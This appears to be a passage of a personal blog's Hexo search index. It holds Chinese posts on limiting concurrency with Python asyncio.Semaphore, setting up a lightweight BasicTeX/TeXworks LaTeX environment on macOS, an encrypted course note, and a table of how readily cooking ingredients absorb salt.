<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Python 3.8+里的asyncio和asyncio.Semaphore</title>
    <url>/tech/asyncio-and-asyncio-semaphore-in-python-3-8/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>asyncio and asyncio.Semaphore in Python 3.8+</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr />
<p>以前的程序放在Python 3.8里跑出错了，原来是由于Python升级3.8后协程库<code>asyncio</code>又双叒叕更新了。 新版本里<code>asyncio.Semaphore</code>的用法改变了，本文简单记录一下新写法。</p>
<a id="more"></a>
<p>代码说明：用<span class="exturl" data-url="aHR0cHM6Ly93d3cucHl0aG9uLWh0dHB4Lm9yZy9hc3luYy8=">支持异步<i class="fa fa-external-link-alt"></i></span>的http库<span class="exturl" data-url="aHR0cHM6Ly93d3cucHl0aG9uLWh0dHB4Lm9yZy8=">httpx<i class="fa fa-external-link-alt"></i></span>简单爬数据，用<code>asyncio.Semaphore</code>控制并发数，而<code>asyncio.Semaphore</code>在Python 3.8中需要配合上下文管理器<code>contextvars.ContextVar</code>使用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> contextvars <span class="keyword">import</span> ContextVar</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crawl</span><span class="params">(concurrency=<span class="number">3</span>)</span>:</span></span><br><span class="line">    context = ContextVar(<span class="string">"concurrent"</span>)  <span class="comment"># 定义全局上下文管理器</span></span><br><span class="line">    URL_BASE = <span class="string">'https://github.com/topics?page='</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">crawl_one</span><span class="params">(i)</span>:</span></span><br><span class="line">        sem = context.get()  <span class="comment"># 获取上下文关键字</span></span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> sem:</span><br><span class="line">            <span class="keyword">async</span> <span class="keyword">with</span> httpx.AsyncClient() <span class="keyword">as</span> client:</span><br><span class="line">                r = <span class="keyword">await</span> client.get(<span class="string">f"<span class="subst">&#123;URL_BASE&#125;</span><span class="subst">&#123;i&#125;</span>"</span>)</span><br><span class="line">                <span class="keyword">return</span> len(r.text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">crawl_all</span><span class="params">()</span>:</span></span><br><span class="line">        context.set(asyncio.Semaphore(concurrency)) <span class="comment">#上下文管理器赋值，concurrency控制并发数</span></span><br><span class="line">        tasks = [asyncio.create_task(crawl_one(i)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>)] <span class="comment"># 将协程封装成任务共30个</span></span><br><span class="line">        done, pending = <span class="keyword">await</span> asyncio.wait(tasks) <span class="comment"># 执行所有任务</span></span><br><span class="line">        <span class="keyword">return</span> done</span><br><span class="line"></span><br><span class="line">    tasks_done = asyncio.run(crawl_all())</span><br><span class="line">    <span class="keyword">return</span> [t.result() <span class="keyword">for</span> t <span class="keyword">in</span> tasks_done]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> crawl(concurrency=<span class="number">1</span>):</span><br><span class="line">        print(r)</span><br></pre></td></tr></table></figure>
<p>参考链接： - <span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYy14LWEvcC8xMDg2ODQ5Ny5odG1s">Python 协程模块 asyncio 使用指南<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Async</tag>
        <tag>Coroutine</tag>
        <tag>Dev</tag>
        <tag>Python</tag>
        <tag>Semaphore</tag>
      </tags>
  </entry>
  <entry>
    <title>用BasicTeX及TeXworks构建轻量LaTex写作环境</title>
    <url>/tech/building-a-lightweight-latex-environment-with-basictex-and-texworks/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Building a lightweight LaTeX Environment With BasicTeX And TeXworks</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr />
<h1 id="按">按</h1>
<ul>
<li>环境：Max OS 10.15</li>
<li>需求 =&gt; 解决方案
<ul>
<li>轻量：TeX Live太重 =&gt; 用精简命令行版<code>BasicTeX</code>替代</li>
<li>简单：仅编写公式及特殊情况下的简单写作 =&gt; 极简TeX编辑器<code>TeXworks</code></li>
</ul></li>
</ul>
<a id="more"></a>
<h1 id="环境安装">环境安装</h1>
<h2 id="安装basictex">安装BasicTeX</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly90dWcub3JnL21hY3RleC9tb3JlcGFja2FnZXMuaHRtbA==">BasicTeX<i class="fa fa-external-link-alt"></i></span>是<code>TeX Live</code>的Mac OS版本<code>MacTeX</code>的精简版，前者80MB，后者好几GB。<code>BasicTex</code>只有核心的TeX语法编译的命令行工具，不包含GUI程序。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew cask install basictex</span><br></pre></td></tr></table></figure>
<p>安装完成后就可以使用<code>TeX Live</code>的包管理命令<code>tlmgr</code>来管理TeX的包(宏集)了。</p>
<p>使刚刚安装的<code>tlmgr</code>命令在当前shell生效</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span> <span class="string">"<span class="variable">$(/usr/libexec/path_helper)</span>"</span></span><br></pre></td></tr></table></figure>
<p>更新内置所有TeX包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo tlmgr update --self --all</span><br></pre></td></tr></table></figure>
<h2 id="安装texworks">安装TeXworks</h2>
<p><span class="exturl" data-url="aHR0cDovL3d3dy50dWcub3JnL3RleHdvcmtzLw==">TeXworks<i class="fa fa-external-link-alt"></i></span>是一款极简的TeX图形编辑器。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew cask install texworks</span><br></pre></td></tr></table></figure>
<h2 id="安装ctex-宏集以支持中文">安装CTeX 宏集以支持中文</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo tlmgr install ctex</span><br></pre></td></tr></table></figure>
<h2 id="你好world">你好，world</h2>
<p>打开 TeXworks，选择<code>XeLaTeX</code>作为排版工具，编译执行</p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line"><span class="tag">\<span class="name">documentclass</span><span class="string">[UTF8]</span><span class="string">&#123;ctexart&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;document&#125;</span></span></span><br><span class="line">你好，world!</span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;document&#125;</span></span></span><br></pre></td></tr></table></figure>
<figure>
<img src="1.png" alt="用TeXworks编写demo" /><figcaption>用TeXworks编写demo</figcaption>
</figure>
<figure>
<img src="2.png" alt="渲染pdf" /><figcaption>渲染pdf</figcaption>
</figure>
<h1 id="编写公式">编写公式</h1>
<p>编写测试数学公式，代码来源于<span class="exturl" data-url="aHR0cHM6Ly9saWFtLnBhZ2UvMjAxNC8wOS8wOC9sYXRleC1pbnRyb2R1Y3Rpb24v">一份其实很短的 LaTeX 入门文档<i class="fa fa-external-link-alt"></i></span></p>
<details>
<p><summary> 公式测试代码 </summary></p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line"><span class="tag">\<span class="name">documentclass</span><span class="string">[UTF8]</span><span class="string">&#123;ctexart&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">usepackage</span><span class="string">&#123;amsmath&#125;</span></span>  <span class="comment">% 为了使用 AMS-LaTeX 提供的数学功能，我们需要在导言区加载 amsmath 宏包</span></span><br><span class="line"><span class="tag">\<span class="name">ctexset</span><span class="string">&#123;section/format=\Large\bfseries&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;document&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">section</span><span class="string">&#123;上下标&#125;</span></span></span><br><span class="line">Einstein 's <span class="formula">$E=mc^2$</span>.</span><br><span class="line"><span class="tag">\<span class="name">[</span></span> E=mc^2. <span class="tag">\<span class="name">]</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;equation&#125;</span></span></span><br><span class="line">E=mc^2.</span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;equation&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">section</span><span class="string">&#123;根式与分式&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="formula">$<span class="tag">\<span class="name">sqrt</span><span class="string">&#123;x&#125;</span></span>$</span>, <span class="formula">$<span class="tag">\<span class="name">frac</span><span class="string">&#123;1&#125;</span><span class="string">&#123;2&#125;</span></span>$</span>.</span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> <span class="tag">\<span class="name">sqrt</span><span class="string">&#123;x&#125;</span></span>, <span class="tag">\<span class="name">]</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> <span class="tag">\<span class="name">frac</span><span class="string">&#123;1&#125;</span><span class="string">&#123;2&#125;</span></span>. <span class="tag">\<span class="name">]</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> z = r<span class="tag">\<span class="name">cdot</span></span> e^&#123;2<span class="tag">\<span class="name">pi</span></span> i&#125;. <span class="tag">\<span class="name">]</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">section</span><span class="string">&#123;运算符&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> <span class="tag">\<span class="name">pm</span></span><span class="tag">\<span class="name">;</span></span> <span class="tag">\<span class="name">times</span></span> <span class="tag">\<span class="name">;</span></span> <span class="tag">\<span class="name">div</span></span><span class="tag">\<span class="name">;</span></span> <span class="tag">\<span class="name">cdot</span></span><span class="tag">\<span class="name">;</span></span> <span class="tag">\<span class="name">cap</span></span><span class="tag">\<span class="name">;</span></span> <span class="tag">\<span class="name">cup</span></span><span class="tag">\<span class="name">;</span></span></span><br><span class="line"><span class="tag">\<span class="name">geq</span></span><span class="tag">\<span class="name">;</span></span> <span class="tag">\<span class="name">leq</span></span><span class="tag">\<span class="name">;</span></span> <span class="tag">\<span class="name">neq</span></span><span class="tag">\<span class="name">;</span></span> <span class="tag">\<span class="name">approx</span></span> <span class="tag">\<span class="name">;</span></span> <span class="tag">\<span class="name">equiv</span></span> <span class="tag">\<span class="name">]</span></span></span><br><span class="line"></span><br><span class="line"><span class="formula">$ <span class="tag">\<span class="name">sum</span></span>_&#123;i=1&#125;^n i<span class="tag">\<span class="name">quad</span></span> <span class="tag">\<span class="name">prod</span></span>_&#123;i=1&#125;^n $</span></span><br><span class="line"><span class="formula">$ <span class="tag">\<span class="name">sum</span></span><span class="tag">\<span class="name">limits</span></span> _&#123;i=1&#125;^n i<span class="tag">\<span class="name">quad</span></span> <span class="tag">\<span class="name">prod</span></span><span class="tag">\<span class="name">limits</span></span> _&#123;i=1&#125;^n $</span></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> <span class="tag">\<span class="name">lim</span></span>_&#123;x<span class="tag">\<span class="name">to</span></span>0&#125;x^2 <span class="tag">\<span class="name">quad</span></span> <span class="tag">\<span class="name">int</span></span>_a^b x^2 dx <span class="tag">\<span class="name">]</span></span></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> <span class="tag">\<span class="name">lim</span></span><span class="tag">\<span class="name">nolimits</span></span> _&#123;x<span class="tag">\<span class="name">to</span></span>0&#125;x^2<span class="tag">\<span class="name">quad</span></span> <span class="tag">\<span class="name">int</span></span><span class="tag">\<span class="name">nolimits</span></span>_a^b x^2 dx <span class="tag">\<span class="name">]</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> <span class="tag">\<span class="name">iint</span></span><span class="tag">\<span class="name">quad</span></span> <span class="tag">\<span class="name">iiint</span></span><span class="tag">\<span class="name">quad</span></span> <span class="tag">\<span class="name">iiiint</span></span><span class="tag">\<span class="name">quad</span></span> <span class="tag">\<span class="name">idotsint</span></span> <span class="tag">\<span class="name">]</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">section</span><span class="string">&#123;定界符（括号等）&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> <span class="tag">\<span class="name">Biggl</span></span>(<span class="tag">\<span class="name">biggl</span></span>(<span class="tag">\<span class="name">Bigl</span></span>(<span class="tag">\<span class="name">bigl</span></span>((x)<span class="tag">\<span class="name">bigr</span></span>)<span class="tag">\<span class="name">Bigr</span></span>)<span class="tag">\<span class="name">biggr</span></span>)<span class="tag">\<span class="name">Biggr</span></span>) <span class="tag">\<span class="name">]</span></span></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> <span class="tag">\<span class="name">Biggl</span><span class="string">[\biggl[\Bigl[\bigl[[x]</span></span><span class="tag">\<span class="name">bigr</span></span>]<span class="tag">\<span class="name">Bigr</span></span>]<span class="tag">\<span class="name">biggr</span></span>]<span class="tag">\<span class="name">Biggr</span></span>] <span class="tag">\<span class="name">]</span></span></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> <span class="tag">\<span class="name">Biggl</span></span> <span class="tag">\<span class="name">&#123;</span></span><span class="tag">\<span class="name">biggl</span></span> <span class="tag">\<span class="name">&#123;</span></span><span class="tag">\<span class="name">Bigl</span></span> <span class="tag">\<span class="name">&#123;</span></span><span class="tag">\<span class="name">bigl</span></span> <span class="tag">\<span class="name">&#123;</span></span><span class="tag">\<span class="name">&#123;</span></span>x<span class="tag">\<span class="name">&#125;</span></span><span class="tag">\<span class="name">bigr</span></span> <span class="tag">\<span class="name">&#125;</span></span><span class="tag">\<span class="name">Bigr</span></span> <span class="tag">\<span class="name">&#125;</span></span><span class="tag">\<span class="name">biggr</span></span> <span class="tag">\<span class="name">&#125;</span></span><span class="tag">\<span class="name">Biggr</span></span><span class="tag">\<span class="name">&#125;</span></span> <span class="tag">\<span class="name">]</span></span></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> <span class="tag">\<span class="name">Biggl</span></span><span class="tag">\<span class="name">langle</span></span><span class="tag">\<span class="name">biggl</span></span><span class="tag">\<span class="name">langle</span></span><span class="tag">\<span class="name">Bigl</span></span><span class="tag">\<span class="name">langle</span></span><span class="tag">\<span class="name">bigl</span></span><span class="tag">\<span class="name">langle</span></span><span class="tag">\<span class="name">langle</span></span> x</span><br><span class="line"><span class="tag">\<span class="name">rangle</span></span><span class="tag">\<span class="name">bigr</span></span><span class="tag">\<span class="name">rangle</span></span><span class="tag">\<span class="name">Bigr</span></span><span class="tag">\<span class="name">rangle</span></span><span class="tag">\<span class="name">biggr</span></span><span class="tag">\<span class="name">rangle</span></span><span class="tag">\<span class="name">Biggr</span></span><span class="tag">\<span class="name">rangle</span></span> <span class="tag">\<span class="name">]</span></span></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> <span class="tag">\<span class="name">Biggl</span></span><span class="tag">\<span class="name">lvert</span></span><span class="tag">\<span class="name">biggl</span></span><span class="tag">\<span class="name">lvert</span></span><span class="tag">\<span class="name">Bigl</span></span><span class="tag">\<span class="name">lvert</span></span><span class="tag">\<span class="name">bigl</span></span><span class="tag">\<span class="name">lvert</span></span><span class="tag">\<span class="name">lvert</span></span> x</span><br><span class="line"><span class="tag">\<span class="name">rvert</span></span><span class="tag">\<span class="name">bigr</span></span><span class="tag">\<span class="name">rvert</span></span><span class="tag">\<span class="name">Bigr</span></span><span class="tag">\<span class="name">rvert</span></span><span class="tag">\<span class="name">biggr</span></span><span class="tag">\<span class="name">rvert</span></span><span class="tag">\<span class="name">Biggr</span></span><span class="tag">\<span class="name">rvert</span></span> <span class="tag">\<span class="name">]</span></span></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> <span class="tag">\<span class="name">Biggl</span></span><span class="tag">\<span class="name">lVert</span></span><span class="tag">\<span class="name">biggl</span></span><span class="tag">\<span class="name">lVert</span></span><span class="tag">\<span class="name">Bigl</span></span><span class="tag">\<span class="name">lVert</span></span><span class="tag">\<span class="name">bigl</span></span><span class="tag">\<span class="name">lVert</span></span><span class="tag">\<span class="name">lVert</span></span> x</span><br><span class="line"><span class="tag">\<span class="name">rVert</span></span><span class="tag">\<span class="name">bigr</span></span><span class="tag">\<span class="name">rVert</span></span><span class="tag">\<span class="name">Bigr</span></span><span class="tag">\<span class="name">rVert</span></span><span class="tag">\<span class="name">biggr</span></span><span class="tag">\<span class="name">rVert</span></span><span class="tag">\<span class="name">Biggr</span></span><span class="tag">\<span class="name">rVert</span></span> <span class="tag">\<span class="name">]</span></span></span><br><span class="line">(x)</span><br><span class="line"><span class="tag">\<span class="name">[</span></span>  <span class="tag">\<span class="name">bigl</span></span>((x)<span class="tag">\<span class="name">bigr</span></span>) <span class="tag">\<span class="name">]</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">section</span><span class="string">&#123;省略号&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> x_1,x_2,<span class="tag">\<span class="name">dots</span></span> ,x_n<span class="tag">\<span class="name">quad</span></span> 1,2,<span class="tag">\<span class="name">cdots</span></span> ,n<span class="tag">\<span class="name">quad</span></span></span><br><span class="line"><span class="tag">\<span class="name">vdots</span></span><span class="tag">\<span class="name">quad</span></span> <span class="tag">\<span class="name">ddots</span></span> <span class="tag">\<span class="name">]</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">section</span><span class="string">&#123;矩阵&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> <span class="tag">\<span class="name">begin</span><span class="string">&#123;pmatrix&#125;</span></span> a&amp;b<span class="tag">\<span class="name">\</span></span>c&amp;d <span class="tag">\<span class="name">end</span><span class="string">&#123;pmatrix&#125;</span></span> <span class="tag">\<span class="name">quad</span></span></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;bmatrix&#125;</span></span> a&amp;b<span class="tag">\<span class="name">\</span></span>c&amp;d <span class="tag">\<span class="name">end</span><span class="string">&#123;bmatrix&#125;</span></span> <span class="tag">\<span class="name">quad</span></span></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;Bmatrix&#125;</span></span> a&amp;b<span class="tag">\<span class="name">\</span></span>c&amp;d <span class="tag">\<span class="name">end</span><span class="string">&#123;Bmatrix&#125;</span></span> <span class="tag">\<span class="name">quad</span></span></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;vmatrix&#125;</span></span> a&amp;b<span class="tag">\<span class="name">\</span></span>c&amp;d <span class="tag">\<span class="name">end</span><span class="string">&#123;vmatrix&#125;</span></span> <span class="tag">\<span class="name">quad</span></span></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;Vmatrix&#125;</span></span> a&amp;b<span class="tag">\<span class="name">\</span></span>c&amp;d <span class="tag">\<span class="name">end</span><span class="string">&#123;Vmatrix&#125;</span></span> <span class="tag">\<span class="name">]</span></span></span><br><span class="line"></span><br><span class="line">Marry has a little matrix <span class="formula">$ ( <span class="tag">\<span class="name">begin</span><span class="string">&#123;smallmatrix&#125;</span></span> a&amp;b<span class="tag">\<span class="name">\</span></span>c&amp;d <span class="tag">\<span class="name">end</span><span class="string">&#123;smallmatrix&#125;</span></span> ) $</span>.</span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">section</span></span>(多行公式)</span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">subsection</span><span class="string">&#123;长公式&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">subsubsection</span><span class="string">&#123;不对齐&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;multline&#125;</span></span></span><br><span class="line">x = a+b+c+&#123;&#125; <span class="tag">\<span class="name">\</span></span></span><br><span class="line">d+e+f+g</span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;multline&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">subsubsection</span><span class="string">&#123;对齐&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;multline*&#125;</span></span></span><br><span class="line">x = a+b+c+&#123;&#125; <span class="tag">\<span class="name">\</span></span></span><br><span class="line">d+e+f+g</span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;multline*&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">subsection</span><span class="string">&#123;公式组&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;gather&#125;</span></span></span><br><span class="line">a = b+c+d <span class="tag">\<span class="name">\</span></span></span><br><span class="line">x = y+z</span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;gather&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;align&#125;</span></span></span><br><span class="line">a &amp;= b+c+d <span class="tag">\<span class="name">\</span></span></span><br><span class="line">x &amp;= y+z</span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;align&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">subsection</span><span class="string">&#123;分段函数&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">[</span></span> y= <span class="tag">\<span class="name">begin</span><span class="string">&#123;cases&#125;</span></span></span><br><span class="line">-x,<span class="tag">\<span class="name">quad</span></span> x<span class="tag">\<span class="name">leq</span></span> 0 <span class="tag">\<span class="name">\</span></span></span><br><span class="line">x,<span class="tag">\<span class="name">quad</span></span> x&gt;0</span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;cases&#125;</span></span> <span class="tag">\<span class="name">]</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;document&#125;</span></span></span><br></pre></td></tr></table></figure>
</details>
<p>渲染的pdf：</p>
<div class="pdfobject-container" data-target="math_example.pdf" data-height="800px"></div>
<h1 id="latex数学公式编写辅助工具">LaTeX数学公式编写辅助工具</h1>
<p>对LaTeX的数学公式语法还不熟悉，可以使用下列工具辅助：</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9tYXRocGl4LmNvbS8=">Mathpix<i class="fa fa-external-link-alt"></i></span>：截图 =&gt; OCR =&gt; LaTex语法的数学公式</li>
<li><span class="exturl" data-url="aHR0cDovL2RldGV4aWZ5LmtpcmVsYWJzLm9yZy9jbGFzc2lmeS5odG1s">Detexify<i class="fa fa-external-link-alt"></i></span>：手写数学符号 =&gt; 识别 =&gt; LaTex语法的数学符号</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93ZWJkZW1vLm15c2NyaXB0LmNvbS92aWV3cy9tYXRoL2luZGV4Lmh0bWw=">Myscript.Math<i class="fa fa-external-link-alt"></i></span>：手写数学公式 =&gt; 识别 =&gt; LaTex语法的数学公式/绘图</li>
</ul>
<h1 id="参考链接">参考链接</h1>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9saWFtLnBhZ2UvMjAxNC8wOS8wOC9sYXRleC1pbnRyb2R1Y3Rpb24v">一份其实很短的 LaTeX 入门文档<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cDovL21pcnJvcnMuaWJpYmxpby5vcmcvQ1RBTi9sYW5ndWFnZS9jaGluZXNlL2N0ZXgvY3RleC5wZGY=">CTEX 宏集手册<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9kb2NzL3RhZy1wbHVnaW5zL3BkZi5odG1s">初心者がBasicTexをmacにインストールする(2019年)<i class="fa fa-external-link-alt"></i></span></li>
</ul>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Tech</tag>
        <tag>LaTeX</tag>
        <tag>Mac OS</tag>
        <tag>Math</tag>
        <tag>TeX</tag>
      </tags>
  </entry>
  <entry>
    <title>「床长人工智能教程」学习笔记 1.1~1.2</title>
    <url>/tech/captainbed-s-ai-lessons-learning-notes-1/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">由于床长的教程是收费课程，因此本笔记不公开，仅供自己复习查阅用。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="10586d3c96353a60b286768804b7b35756deef23fc7ca0933d35552bf75af000"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Learning Notes</tag>
        <tag>Tech</tag>
        <tag>AI</tag>
        <tag>Neural Network</tag>
      </tags>
  </entry>
  <entry>
    <title>二厨笔记 #1: 食材吸盐度小结</title>
    <url>/life/dog2s-cooking-notes-1/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Dog2's Cooking Notes #1: Salt Absorption Rate of Food Ingredients</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr />
<blockquote>
<p>学习炒菜已两月有余，觉得有些普适性的经验值得总结，便在此记录一下。</p>
<p>本篇总结一下不同食材的吸盐度。</p>
</blockquote>
<h2 id="前言">前言</h2>
<p>一道菜通常由多种食材混合烹制而成，其咸味轻重会直接影响口感。不同食材对盐的吸收能力不尽相同，因此较好地平衡不同食材的咸度是佳作的重要因素之一。但网上绝大多数菜谱或教程很少考虑这一点，大多数菜谱都是在所有食材都已入锅且烹制即将完成前放入盐的，这容易造成一道菜最终由于不同食材咸淡不均而影响口感。</p>
<h2 id="食材吸盐度表">食材吸盐度表</h2>
<ul>
<li>下表记录在炒制或煮制过程中不同食材对盐的吸收难易程度，完全根据个人经验，因此未必准确，如有不妥欢迎指正。</li>
<li>虽然此表反应的是吸盐难易程度，但也可引申为相关食材入味（酸/甜/苦/辣）的难易程度。</li>
<li>可以参考下表调整烹制时食材的形状，或调整盐与各种食材入锅的先后，以平衡不同食材的咸度。</li>
<li>吸盐度0-5分，5分表示极易吸盐，0分表示极难吸盐。</li>
</ul>
<a id="more"></a>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">食材</th>
<th style="text-align: center;">形状</th>
<th style="text-align: center;">吸盐度</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">白菜</td>
<td style="text-align: center;">叶片</td>
<td style="text-align: center;">2.8</td>
</tr>
<tr class="even">
<td style="text-align: center;">白萝卜</td>
<td style="text-align: center;">切片</td>
<td style="text-align: center;">3.5</td>
</tr>
<tr class="odd">
<td style="text-align: center;">包菜</td>
<td style="text-align: center;">手撕片</td>
<td style="text-align: center;">3</td>
</tr>
<tr class="even">
<td style="text-align: center;">大蒜</td>
<td style="text-align: center;">切碎粒</td>
<td style="text-align: center;">2</td>
</tr>
<tr class="odd">
<td style="text-align: center;">黄豆芽</td>
<td style="text-align: center;"></td>
<td style="text-align: center;">3</td>
</tr>
<tr class="even">
<td style="text-align: center;">胡萝卜</td>
<td style="text-align: center;">丁</td>
<td style="text-align: center;">2.5</td>
</tr>
<tr class="odd">
<td style="text-align: center;">茄子</td>
<td style="text-align: center;">丁/条</td>
<td style="text-align: center;">4.5</td>
</tr>
<tr class="even">
<td style="text-align: center;">鸡蛋</td>
<td style="text-align: center;">搅拌后煎块</td>
<td style="text-align: center;">3.6</td>
</tr>
<tr class="odd">
<td style="text-align: center;">鸡蛋</td>
<td style="text-align: center;">搅拌后入汤</td>
<td style="text-align: center;">3.4</td>
</tr>
<tr class="even">
<td style="text-align: center;">金针菇</td>
<td style="text-align: center;"></td>
<td style="text-align: center;">4</td>
</tr>
<tr class="odd">
<td style="text-align: center;">木耳</td>
<td style="text-align: center;">小朵</td>
<td style="text-align: center;">1.5</td>
</tr>
<tr class="even">
<td style="text-align: center;">藕</td>
<td style="text-align: center;">丁</td>
<td style="text-align: center;">3.4</td>
</tr>
<tr class="odd">
<td style="text-align: center;">青椒</td>
<td style="text-align: center;">丝</td>
<td style="text-align: center;">1.5</td>
</tr>
<tr class="even">
<td style="text-align: center;">土豆</td>
<td style="text-align: center;">薄片</td>
<td style="text-align: center;">2.8</td>
</tr>
<tr class="odd">
<td style="text-align: center;">土豆</td>
<td style="text-align: center;">细丝</td>
<td style="text-align: center;">2.8</td>
</tr>
<tr class="even">
<td style="text-align: center;">杏鲍菇</td>
<td style="text-align: center;">切片</td>
<td style="text-align: center;">3</td>
</tr>
<tr class="odd">
<td style="text-align: center;">有机花菜</td>
<td style="text-align: center;">切小朵</td>
<td style="text-align: center;">2</td>
</tr>
<tr class="even">
<td style="text-align: center;">猪肉</td>
<td style="text-align: center;">排骨</td>
<td style="text-align: center;">3</td>
</tr>
<tr class="odd">
<td style="text-align: center;">猪肉</td>
<td style="text-align: center;">丝/丁</td>
<td style="text-align: center;">3.2</td>
</tr>
</tbody>
</table>
<h2 id="后话">后话</h2>
<p>尽信书不如无书，菜谱亦然（，我朝一些书“超然”，比如某几门教科书@_@ 。。）。在看完菜谱并了解了其中不同食材的入锅顺序后，可结合上表总结的食材吸盐度来调整盐的放入方式，如可将菜谱中常见的起锅前一次性放入盐的方式改为分次放入，并合适掌控放入量，甚至可以考虑相应地更改食材的放入顺序，相信有时可以收获超越原菜谱水准的意外惊喜。</p>
